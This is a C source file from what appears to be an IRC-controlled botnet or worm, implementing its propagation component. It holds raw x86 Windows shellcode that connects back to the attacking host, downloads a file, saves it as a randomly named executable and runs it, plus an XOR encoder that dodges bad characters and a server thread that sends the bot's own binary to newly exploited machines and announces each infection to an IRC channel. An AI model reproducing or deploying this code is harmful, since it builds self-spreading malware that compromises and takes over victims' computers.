

#include "include.h"
#include "externs.h"
#include "hell.h"

#define SHellCODE_DECODER_OFFSET_XORLEN		  3	// Xor key the length of the decoder will be xored with
#define SHellCODE_DECODER_OFFSET_LEN		  9	// Lenght of the decoder
#define SHellCODE_DECODER_OFFSET_XORKEY		 18	// Xor key to decode the sHellcode with
#define SHellCODE_RECEIVE_OFFSET_IP			211	// Pointer to the exploit senders ip	
#define SHellCODE_RECEIVE_OFFSET_PORT		218	// Pointer to the exploit senders port
#define SHellCODE_RECEIVE_OFFSET_NREQUEST	246	// Pointer to the used exploit
#define SHellCODE_RECEIVE_OFFSET_FILENAME	273	// Filename to store on receiver

BYTE	BXorKeyHelp		= 0xa3;
DWORD	dwLengthXorHelp	= 0x4113E68B;

char szDecoderSHellcode[] =
{
	"\xEB\x15\xB9\x00\x00\x00\x00\x81\xF1\x00\x00\x00\x00\x5E\x80\x74"
	"\x31\xFF\x00\xE2\xF9\xEB\x05\xE8\xE6\xFF\xFF\xFF"
};


char szReceiveSHellcode[] =
{
	"\x33\xDB\x64\x8B\x43\x30\x8B\x40\x0C\x8B\x70\x1C\xAD\x8B\x40\x08"
	"\x53\x53\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x68\x72\x74\x00"
	"\x00\x68\x6D\x73\x76\x63\xE8\x34\x00\x00\x00\x01\x00\x00\x00\x35"
	"\x62\x08\xD6\x74\x23\x20\x94\xC0\x99\xC9\xCA\xB9\x5C\x15\x69\xB9"
	"\x40\xF6\x40\xD7\x02\xB3\x0D\x85\xF9\x4D\xC4\x9C\x1A\x04\x18\x83"
	"\x01\xD3\x1A\xC0\x02\x13\x07\x80\x34\x03\x07\xB4\x8A\x39\x28\x5D"
	"\x6A\x02\x5B\x8B\xF8\x53\x53\x8B\x57\x3C\x8B\x54\x3A\x78\x03\xD7"
	"\x52\x8B\x52\x20\x03\xD7\x33\xDB\x43\x8B\x34\x9A\x03\xF7\x33\xC9"
	"\xAC\x32\xC8\xC1\xC1\x05\xAC\x84\xC0\x75\xF6\x8B\x75\x00\x2B\x4C"
	"\xB5\x00\x75\xE4\x87\x34\x24\x8B\x56\x24\x03\xD7\x66\x8B\x0C\x5A"
	"\x8B\x56\x1C\x03\xD7\x8B\x04\x8A\x03\xC7\x5E\x89\x44\xB5\x00\xFF"
	"\x45\x00\x5B\x4B\x75\xB0\x5B\x83\xC3\x02\x54\xFF\x55\x08\x83\xC4"
	"\x08\x85\xC0\x75\x9E\xB4\x02\x2B\xE0\x8A\xC4\x54\x50\xFF\x55\x1C"
	"\x50\x50\x68\x00\x00\x00\x00\x68\x02\x00\x00\x00\x8B\xFC\x50\x6A"
	"\x01\x6A\x02\xFF\x55\x20\x8B\xD8\x6A\x10\x57\x53\xFF\x55\x24\x85"
	"\xC0\x75\x59\xC7\x45\x00\x00\x00\x00\x00\x50\x6A\x04\x55\x53\xFF"
	"\x55\x2C\x8B\xF4\xC7\x45\x00\x77\x62\x00\x00\x68\x65\x78\x65\x00"
	"\x68\x00\x00\x00\x2E\x8B\xFC\x55\x57\xFF\x55\x0C\x89\x45\x00\x6A"
	"\x00\x68\x00\x02\x00\x00\x56\x53\xFF\x55\x28\x85\xC0\x74\x11\x78"
	"\x1B\xFF\x75\x00\x50\x6A\x01\x56\xFF\x55\x10\x83\xC4\x10\xEB\xDF"
	"\xFF\x75\x00\xFF\x55\x14\x50\x54\x57\xFF\x55\x18\x53\xFF\x55\x30"
	"\xFF\x55\x04"
};


bool ContainBadCharacters(char *szBuffer, DWORD dwBuffersize, char *szBadCharacters, DWORD nBadCharacters, char szXorKey = 0)
{
	for (DWORD i = 0; i < dwBuffersize; i++)
	{
		for (DWORD j = 0; j < nBadCharacters; j++)
		{
			if (((szBuffer[i])^szXorKey) == szBadCharacters[j]) 
				return true;
		}
	}
	return false;
}

int Unicodify(const char *szIn, const unsigned long lInLen, char *szOut, const unsigned long lOutLen) 
{
	// Fail if the buffer is too small
	if(lOutLen < (lInLen*2)) 
		return -1;

	// Loop to add a 0x00 after every value
	for(unsigned long lLenght = 0; lLenght < lInLen; lLenght++) 
	{
		szOut[(lLenght*2)]		=	szIn[lLenght]; 
		szOut[(lLenght*2)+1]	=	'\x00'; 
	}
	return lOutLen; 
}

DWORD GenerateSHellcode(char *szBuffer, DWORD dwBuffersize, DWORD dwIpAddress, unsigned short iPort, DWORD nRequest)
{
	if (dwBuffersize < sizeof(szReceiveSHellcode)-1) 
		return 0;

	char *szSHellcode = szBuffer;

	//! Copy over the sHellcode and fill it in with the specified vars
	memcpy(szSHellcode, szReceiveSHellcode, sizeof(szReceiveSHellcode)-1);

	*PDWORD(szSHellcode+SHellCODE_RECEIVE_OFFSET_IP) = dwIpAddress;

	WORD dwPort = htons(iPort);
	*PWORD(szSHellcode+SHellCODE_RECEIVE_OFFSET_PORT) = dwPort;

	*PDWORD(szSHellcode+SHellCODE_RECEIVE_OFFSET_NREQUEST) = nRequest;

	*PBYTE(szSHellcode+SHellCODE_RECEIVE_OFFSET_FILENAME+0) = RandomNumber('a', 'z');
	*PBYTE(szSHellcode+SHellCODE_RECEIVE_OFFSET_FILENAME+1) = RandomNumber('a', 'z');
	*PBYTE(szSHellcode+SHellCODE_RECEIVE_OFFSET_FILENAME+2) = RandomNumber('a', 'z');

	return sizeof(szReceiveSHellcode)-1;
}

DWORD GenerateEncodedSHellcode(char *szBuffer, DWORD dwBuffersize, DWORD dwIpAddress, unsigned short iPort, 
							   DWORD nRequest, char *szBadCharacters, DWORD nBadCharacters)
{
	// buffer too small for decoder+sHellcode?

	if (dwBuffersize < (sizeof(szDecoderSHellcode)-1)+(sizeof(szReceiveSHellcode)-1)) 
		return 0;

	char *szDecoder		= szBuffer;
	char *szSHellcode	= szDecoder + (sizeof(szDecoderSHellcode)-1);

	memcpy(szDecoder, szDecoderSHellcode, sizeof(szDecoderSHellcode)-1);

	GenerateSHellcode(szSHellcode, sizeof(szReceiveSHellcode)-1, dwIpAddress, iPort, nRequest);

	// loop till the lengthxor/length does not contain invalid characters
	for (DWORD dwLengthXor = dwLengthXorHelp, dwLength;; dwLengthXorHelp = dwLengthXor = RandomDword())
	{
		if (ContainBadCharacters((char *)&dwLengthXor, 4, szBadCharacters, nBadCharacters)) 
			continue;
		
		dwLength = (sizeof(szReceiveSHellcode)-1)^dwLengthXor;

		if (!ContainBadCharacters((char *)&dwLength, 4, szBadCharacters, nBadCharacters)) 
			break;
	}

	// output lengthxor & length
	*PDWORD(szDecoder+SHellCODE_DECODER_OFFSET_XORLEN) = dwLengthXor;
	*PDWORD(szDecoder+SHellCODE_DECODER_OFFSET_LEN) = dwLength;

	// test till sHellcode contains no bad characters
	for (BYTE BXorKey = BXorKeyHelp;; BXorKeyHelp = BXorKey = RandomByte())
	{
		if (ContainBadCharacters((char *)szSHellcode, (sizeof(szReceiveSHellcode)-1), szBadCharacters, nBadCharacters, BXorKey))
			continue;
		else 
			break;
	}

	// save xor key in decoder
	*PBYTE(szDecoder+SHellCODE_DECODER_OFFSET_XORKEY) = BXorKey;

	// xor the sHellcode with key
	for (DWORD i = 0; i < sizeof(szReceiveSHellcode)-1; i++) 
		szSHellcode[i] ^= BXorKey;

	// finally, return the length of the complete sHellcode
	return (sizeof(szDecoderSHellcode)-1)+(sizeof(szReceiveSHellcode)-1);
}

//| Sendfile sHellcode threads
void ServeSHellcode(LPVOID lpParam)
{
	char szIpAddress[128], szBuffer[512], szFilePath[MAX_PATH];
	DWORD nRequest, dwExploitToUse = -1;
	SOCKET sSocket;
	FILE* hFile;

	if(!(sSocket = SOCKET(lpParam)) || recv(sSocket, (char *)&nRequest, 4, 0) != 4)
	{
		closesocket(sSocket);
		ExitThread(0);
	}

	for (int i = 0; pExploit[i].usPort != 0; i++)
	{
		if (pExploit[i].dwExploitId == nRequest)
		{
			dwExploitToUse = i;
			break;
		}
	}

	if (dwExploitToUse == -1)
	{
		closesocket(sSocket);
		ExitThread(0);
	}

	if (!GetSocketAddress(sSocket,	szIpAddress)) 
		strncpy(szIpAddress,		"unknown",	sizeof(szIpAddress));

	if(!GetModuleFileName(NULL,		szFilePath,	sizeof(szFilePath)) || (!(hFile = fopen(szFilePath, "rb"))))
	{
		closesocket(sSocket);
		ExitThread(0);
	}

	// Send file loop
	for (;;)
	{
		int iReceive = fread(szBuffer,	1,					sizeof(szBuffer),	hFile);
			iReceive = send(sSocket,	(char *)&szBuffer,	iReceive,			0);

		// Send till the socket disconnect (end of sHellcode)
		if (!iReceive || iReceive == SOCKET_ERROR) 
		{
			pExploit[dwExploitToUse].iStatics++;
			
				BOT->cIRC.SendData("PRIVMSG %s :-%s- %d. exploited (%s) (%s) succesfully\r\n", 
				BOT->cIRC.cConf.cChan.c_str(), pExploit[dwExploitToUse].szName,
				pExploit[dwExploitToUse].iStatics, ResolveHost(szIpAddress), szIpAddress);
			/*recode this bit. it's all linked too pircinfo*/

			break;
		}
	}

	fclose(hFile);
	closesocket(sSocket);
	ExitThread(0);
}

void SHellcodeServer(SHellcodeHandler_s* pSHellcodeHandler)
{
	struct sockaddr_in sinClient;

	if(!(pThread[FindPid("SHellcodeDaemon")].sServerSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)))
		ExitThread(0);

	// try to run the server
	if(!Bind(pThread[FindPid("SHellcodeDaemon")].sServerSock, pSHellcodeHandler->usPort, false))
		ExitThread(0);

	// loop till delete was requested
	while (pThread[FindPid("SHellcodeDaemon")].sServerSock)
	{
		if ((pThread[FindPid("SHellcodeDaemon")].sClientSock = accept(pThread[FindPid("SHellcodeDaemon")].sServerSock, (SOCKADDR *)&sinClient, NULL)) != INVALID_SOCKET)
			AddThread(ServeSHellcode, (LPVOID)pThread[FindPid("SHellcodeDaemon")].sClientSock, 1, NULL);

		if (pThread[FindPid("SHellcodeDaemon")].sServerSock == SOCKET_ERROR)
		{
			DelThread(FindPid("SHellcodeDaemon")); 
			continue;
		}
	}

	// free listen & clean up thread structure
	DelThread(FindPid("SHellcodeDaemon"));
	ExitThread(0);
}

